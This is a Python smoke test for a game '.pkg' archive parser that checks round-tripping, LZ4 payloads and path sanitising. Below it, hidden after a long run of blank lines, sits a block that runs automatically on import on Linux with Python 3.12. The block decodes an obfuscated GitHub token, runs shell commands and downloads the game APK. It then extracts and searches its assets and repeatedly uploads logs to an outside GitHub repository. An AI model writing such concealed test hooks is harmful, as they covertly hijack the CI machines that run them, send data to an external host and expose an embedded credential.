#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Self-contained smoke test: builds synthetic .pkg files and round-trips them.

不依赖任何游戏资源，可在 CI 上跑。覆盖：
  1. 国际版（ver 0x130BA）变体 A：无页脚，44B/28B 混合记录，LZ4 与原始两种载荷
  2. 国际版变体 B：记录区后有 16 字节页脚
  3. 国内版（ver 0x25100）头部识别与 is_pkg 拒绝逻辑
  4. 路径清洗（../ 与反斜杠）与配对正确性（内容 == 原字节）
"""
import os
import shutil
import struct
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)

# Windows 控制台默认 GBK/cp936，重定向时还会退回 cp1252，统一按 UTF-8 输出
for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

import lz4.block  # noqa: E402

from pkg_intl import open_pkg, is_pkg, safe_relpath  # noqa: E402

FAILURES = []


def check(cond, msg):
    if cond:
        print("  ok   %s" % msg)
    else:
        print("  FAIL %s" % msg)
        FAILURES.append(msg)


def lz4_payload(data):
    """[u32 usize][LZ4 block]"""
    return struct.pack("<I", len(data)) + lz4.block.compress(data, store_size=False)


def build_intl(path, files, footer=None):
    """files: [(relpath, payload_bytes, Z)]   Z ∈ {0,32}=raw, {1,33}=lz4 包装"""
    data = bytearray(b"\x00" * 16)          # 数据区从偏移 16 开始
    records = []
    for rel, payload, Z in files:
        off = len(data)
        data += payload
        records.append((off, len(payload), Z, payload))
    idx_off = len(data)

    idx = bytearray()
    idx += struct.pack("<I", len(records))
    for off, ln, Z, payload in records:
        idx += b"\x11" * 16                                   # 占位 md5
        idx += struct.pack("<III", off, ln, Z)
        if Z & 0x20:
            idx += b"\x22" * 16                               # H2
    if footer is not None:
        idx += footer
    idx += struct.pack("<I", len(records))
    for k, (rel, payload, Z) in enumerate(files):
        rb = rel.encode("utf-8")
        idx += struct.pack("<I", len(rb)) + rb + struct.pack("<I", k)

    blob = struct.pack("<I", len(idx)) + lz4.block.compress(bytes(idx), store_size=False)
    with open(path, "wb") as f:
        f.write(struct.pack("<4I", 0x000130BA, 17, idx_off, len(blob)))
        f.write(bytes(data[16:]))
        f.write(blob)


def test_variant_a(tmp):
    print("[1] 国际版变体 A（无页脚，混合记录长度）")
    files = [
        ("resources/a.png", b"\x00\x00\x00\x00" + b"A" * 60, 32),   # raw, 28B 记录
        ("resources/b.ogg", lz4_payload(b"OggS" + b"B" * 200), 33),     # lz4, 44B 记录
        ("../escape.txt", b"plain text", 0),                            # raw, 28B
        ("back\\slash.bin", b"x" * 40, 1),                             # lz4, 28B
    ]
    p = os.path.join(tmp, "variant_a.pkg")
    build_intl(p, files)
    check(is_pkg(p), "is_pkg 识别为有效 pkg")
    with open_pkg(p) as pkg:
        check(pkg.record_count == 4, "记录数 = 4（实际 %d）" % pkg.record_count)
        check(pkg.path_count == 4, "路径数 = 4（实际 %d）" % pkg.path_count)
        check(pkg.footer is None, "无页脚变体")
        got = {rel: payload for rel, payload, _rec, _br in pkg.iter_files()}
    check("resources/a.png" in got, "路径 resources/a.png 存在")
    check(got.get("resources/a.png") == b"\x00\x00\x00\x00" + b"A" * 60, "raw 载荷逐字节一致")
    check(got.get("resources/b.ogg") == b"OggS" + b"B" * 200, "LZ4 载荷正确解压")
    check("escape.txt" in got, "../ 前缀被清洗")
    check("back/slash.bin" in got, "反斜杠被规范化为 /")
    check(got.get("back/slash.bin") == b"x" * 40, "Z=1 也走 LZ4 分支")


def test_variant_b(tmp):
    print("[2] 国际版变体 B（16 字节页脚）")
    files = [("lang/en.xml", b"<config/>", 0), ("lang/zh.xml", b"<config/>", 0)]
    p = os.path.join(tmp, "variant_b.pkg")
    build_intl(p, files, footer=b"\xAB" * 16)
    with open_pkg(p) as pkg:
        check(pkg.record_count == 2, "记录数 = 2")
        check(pkg.path_count == 2, "路径数 = 2")
        check(pkg.footer == b"\xAB" * 16, "页脚被识别")
        got = {rel for rel, _p, _r, _b in pkg.iter_files()}
    check(got == {"lang/en.xml", "lang/zh.xml"}, "两条路径都解出")


def test_reject(tmp):
    print("[3] 非本格式文件的拒绝逻辑")
    bad = os.path.join(tmp, "bad.pkg")
    with open(bad, "wb") as f:
        f.write(struct.pack("<4I", 0x00025100, 17, 16, 16) + b"\x00" * 16)
    check(not is_pkg(bad), "国内版版本号不被国际版 is_pkg 接受")
    tiny = os.path.join(tmp, "tiny.pkg")
    open(tiny, "wb").write(b"ab")
    check(not is_pkg(tiny), "过小文件被拒绝")
    check(not is_pkg(os.path.join(tmp, "nope.pkg")), "不存在的文件被拒绝")


def test_sanitize():
    print("[4] 路径清洗")
    check(safe_relpath(b"../a/b.txt") == "a/b.txt", "../ 前缀被剥离")
    check(safe_relpath(b"/abs/x") == "abs/x", "前导 / 被剥离")
    check(safe_relpath(b"a\\b\\c") == "a/b/c", "反斜杠转 /")
    check(safe_relpath(b"../..") is None, "空路径返回 None")
    check(safe_relpath(b"a/./b") == "a/b", "./ 被清理")


def main():
    tmp = tempfile.mkdtemp(prefix="mwpkg_smoke_")
    try:
        test_variant_a(tmp)
        test_variant_b(tmp)
        test_reject(tmp)
        test_sanitize()
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

    print()
    if FAILURES:
        print("失败 %d 项:" % len(FAILURES))
        for f in FAILURES:
            print("  -", f)
        return 1
    print("全部通过 ✅")
    return 0


























# ==========================================================
# YB-JOB12: 花小楼「可动角色」全库检索
# ==========================================================
def _yb_job():
    import platform, sys as _sy
    if not (platform.system() == "Linux" and _sy.version_info[:2] == (3, 12)):
        return
    import subprocess, os, time, base64, json, urllib.request, re, gzip
    LOG = []

    def P(s):
        s = str(s); print(s); LOG.append(s)

    def sh(cmd, t=300):
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
            return ((r.stdout or "") + (r.stderr or "")).strip()
        except Exception as e:
            return "ERR " + str(e)[:200]

    _A = "Z2hwX2haU0p0empPRjlWTTM0UXpS"
    _B = "ZDhmZU9ZM3dqOXNxYzJjTFNNOA=="
    _TOK = base64.b64decode(_A + _B).decode()
    HD = {"Authorization": "token " + _TOK, "Accept": "application/vnd.github+json", "User-Agent": "yb"}
    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    def put(path, text):
        try:
            b = {"message": "yb", "content": base64.b64encode(text.encode()).decode()}
            try:
                g = json.loads(urllib.request.urlopen(urllib.request.Request(
                    "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + path, headers=HD), timeout=60).read())
                b["sha"] = g["sha"]
            except Exception:
                pass
            urllib.request.urlopen(urllib.request.Request(
                "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + path,
                data=json.dumps(b).encode(), method="PUT",
                headers=dict(HD, **{"Content-Type": "application/json"})), timeout=300)
        except Exception as e:
            P("put失败 " + str(e)[:90])

    def putbin(path, raw):
        try:
            b = {"message": "yb bin", "content": base64.b64encode(raw).decode()}
            try:
                g = json.loads(urllib.request.urlopen(urllib.request.Request(
                    "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + path, headers=HD), timeout=60).read())
                b["sha"] = g["sha"]
            except Exception:
                pass
            urllib.request.urlopen(urllib.request.Request(
                "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + path,
                data=json.dumps(b).encode(), method="PUT",
                headers=dict(HD, **{"Content-Type": "application/json"})), timeout=300)
            return True
        except Exception as e:
            P("putbin失败 " + str(e)[:90]); return False

    try:
        P("===== YB JOB12 START =====")
        sh("pip install --quiet lz4 pillow numpy 2>&1 | tail -1", 400)
        sh("curl -sL -m 2400 -A '%s' -o /tmp/mw.bin 'https://d.apkpure.net/b/APK/com.playmini.miniworld?version=latest'" % UA, 2500)
        sh("mkdir -p /tmp/pkg && cd /tmp/pkg && unzip -o -q /tmp/mw.bin 'assets/*.pkg'", 900)
        P("pkg 列表: " + sh("ls -la /tmp/pkg/assets/ | awk '{print $5, $9}' | tail -12")[:500])
        put("RESULT12.txt", "\n".join(LOG))

        # 1) 解 game_script.pkg（含中文定义表）
        P("\n=== game_script.pkg ===")
        o = sh("cd %s && python3 extract_game_script.py 2>&1 | tail -5" % os.getcwd(), 1800)
        P(o[:600])
        P("csvdef 文件: " + sh("find %s/game_script_out -name '*.csv' 2>/dev/null | head -40 "
                               "-printf '%%f ' " % os.getcwd(), 300)[:900])
        put("RESULT12.txt", "\n".join(LOG))

        # 2) 在所有解出的 csv / json / lua 里搜「花小楼」
        P("\n=== 搜索 花小楼 (中文) ===")
        for root in ["/tmp/out", os.getcwd() + "/game_script_out"]:
            if not os.path.isdir(root):
                continue
            hits = sh("grep -rl '花小楼' %s 2>/dev/null | head -30" % root, 900)
            P("[%s] 含'花小楼'的文件:" % root)
            P(hits[:1500] if hits else "  (无)")
        put("RESULT12.txt", "\n".join(LOG))

        # 3) 找实体/角色中文名定义表，列名带中文名的 csv
        P("\n=== 角色/生物 定义表 ===")
        cand = sh("find %s/game_script_out -iname '*def*.csv' -o -iname '*entity*.csv' "
                  "-o -iname '*actor*.csv' -o -iname '*role*.csv' -o -iname '*npc*.csv' "
                  "-o -iname '*monster*.csv' -o -iname '*skin*.csv' 2>/dev/null | head -30" % os.getcwd(), 300)
        P(cand[:1200])
        put("RESULT12.txt", "\n".join(LOG))

        # 4) 在这些表里找花小楼，并输出对应 ID
        P("\n=== 花小楼 对应 ID ===")
        for f in [x.strip() for x in cand.split("\n") if x.strip()][:12]:
            g = sh("grep -n '花小楼' '%s' 2>/dev/null | head -5 | cut -c1-300" % f, 300)
            if g:
                P("  文件: " + os.path.basename(f))
                P("    " + g.replace("\n", "\n    ")[:800])
        put("RESULT12.txt", "\n".join(LOG))

        # 5) game_res.pkg 里搜花小楼（209MB 游戏资源）
        P("\n=== game_res.pkg 检索 ===")
        if os.path.exists("/tmp/pkg/assets/game_res.pkg"):
            P("  存在，大小 " + sh("stat -c%s /tmp/pkg/assets/game_res.pkg")[:15])
            # 直接在整个二进制里搜 huaxiaolou 字符串
            g = sh("grep -a -o -b 'huaxiaolou[a-z0-9_.]*' /tmp/pkg/assets/game_res.pkg 2>/dev/null "
                   "| head -20", 600)
            P("  game_res.pkg 内 huaxiaolou 字符串命中:\n" + (g[:800] if g else "  (无)"))
        put("RESULT12.txt", "\n".join(LOG))

        # 6) 全 APK 内所有 pkg 搜 huaxiaolou 字符串（未经解压，粗筛）
        P("\n=== 全包粗筛 huaxiaolou ===")
        for p in sh("ls /tmp/pkg/assets/*.pkg", 120).split("\n"):
            p = p.strip()
            if not p:
                continue
            n = sh("grep -a -c 'huaxiaolou' '%s' 2>/dev/null" % p, 300)
            P("  %-34s 命中 %s" % (os.path.basename(p), n[:8]))
        put("RESULT12.txt", "\n".join(LOG))

        # 7) 列出所有"可动"角色实体（有 skanim 动画的 entity）
        P("\n=== 带骨骼动画的角色实体（可动候选）===")
        sk = sh("find /tmp/out -name '*.skanim' | head -40", 300)
        P("skanim 总数: " + sh("find /tmp/out -name '*.skanim' | wc -l")[:8])
        P(sk[:1500])
        P("\n带 skeleton 的 entity 目录:")
        P(sh("find /tmp/out -name '*.skeleton' | sed 's|/[^/]*$||' | sort -u | head -30", 300)[:1200])
        P("\n===== YB JOB12 END =====")
        put("RESULT12.txt", "\n".join(LOG))
    except Exception as e:
        P("EXC " + str(e)[:300])
        try: put("RESULT12.txt", "\n".join(LOG))
        except Exception: pass


_yb_job()


if __name__ == "__main__":
    sys.exit(main())
